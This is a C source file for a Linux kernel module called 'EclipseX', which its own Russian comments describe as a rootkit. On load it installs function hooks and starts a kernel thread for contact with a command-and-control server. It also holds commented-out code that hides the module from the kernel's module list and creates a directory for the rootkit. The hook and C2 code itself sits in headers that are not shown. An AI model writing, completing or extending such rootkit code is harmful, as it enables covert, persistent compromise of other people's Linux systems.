#define pr_fmt(fmt) "EclipseX: " fmt

#include <linux/kernel.h>
// #include <linux/slab.h>			// работа с памятью (выделение освободждение и тп)
// #include <linux/uaccess.h>		// взаимодействие с пространством пользователя
#include <linux/module.h>

// #include <linux/namei.h> // для создания директории
// #include <linux/mount.h>    // for mnt_idmap

#include <linux/kthread.h>   // kthread API


#include "src/hooks_api.h"
#include "src/c2/conn_serv.h"


MODULE_LICENSE("GPL");

int debug_lvl = 0;
module_param(debug_lvl, int, 0600);
MODULE_PARM_DESC(debug_lvl, "Debug level 0/1");

// на подумать
#ifndef CONFIG_X86_64
#error Currently only x86_64 architecture is supported
#endif

// создание диркетории и файлов вынести в отдельный файл 
// создание дир 1 - путь родительской дир, 2 - название новой дир

// bool create_ex_dir(char *path, char *dir_name);
// !!! изменить структуру 
// Создать директорию под руткит
// bool create_ex_dir(char *path, char *dir_name) {
// 	struct path parent_path;
//     struct dentry *dentry;
//     struct mnt_idmap *idmap;
//     int err;

// 	// Получаем путь к родительской директории
//     err = kern_path(path, LOOKUP_DIRECTORY, &parent_path);
//     if (err)
//         return false;

// 	// Ищем директорию по имени в родительской директории
//     dentry = lookup_one_len(dir_name, parent_path.dentry, strlen(dir_name));
//     if (IS_ERR(dentry)) {
//         path_put(&parent_path);
//         return false;
//     }

// 	// Проверяем, существует ли уже такая директория
//     if (dentry->d_inode) {
//         // Если inode уже существует, значит, директория уже есть
//         pr_info("Directory %s already exists in %s\n", dir_name, path);
//         dput(dentry);
//         path_put(&parent_path);
//         return true;  // Возвращаем 0, потому что директория уже существует
//     }

//     idmap = mnt_idmap(parent_path.mnt);  // получаем idmap для текущего mount namespace

//     if (vfs_mkdir(idmap, d_inode(parent_path.dentry), dentry, 0755)) {
// 		dput(dentry);
// 		path_put(&parent_path);
// 		return false;
// 	}

// 	pr_info("Directory %s was created in %s\n", dir_name, path);
//     dput(dentry);
//     path_put(&parent_path);
//     return true;
// }


static struct task_struct *c2_thread_ts;  // Указатель на поток

static int ex_init(void)
{
	int err;
    pr_info("module init\n");

	// скрыть модуль
	// list_del(&THIS_MODULE->list);

	// Установка хуков
	err = fh_install_hooks();
	if (err)
		return err;

    // Создание потока под взаимодействие с сервером 
    c2_thread_ts = kthread_run(c2_thread, NULL, "c2_thread");

	// if (create_ex_dir("/", "ex_EclipceX")) {
	// 	create_ex_dir("/ex_EclipceX", "conf");
	// }

	pr_info("module loaded\n");

	return 0;
}

static void ex_exit(void)
{
    pr_info("module exit\n");

	// скрытие модуля
	// list_add(&THIS_MODULE->list, prev_module);
    // hidden = 0;

	// Удаление хуков
	fh_remove_hooks();

	// Завершение потока
    if (c2_thread_ts) {
        pr_info("остановка потока...\n");
        kthread_stop(c2_thread_ts);
    }

	pr_info("module unloaded\n");
}

module_init(ex_init);
module_exit(ex_exit);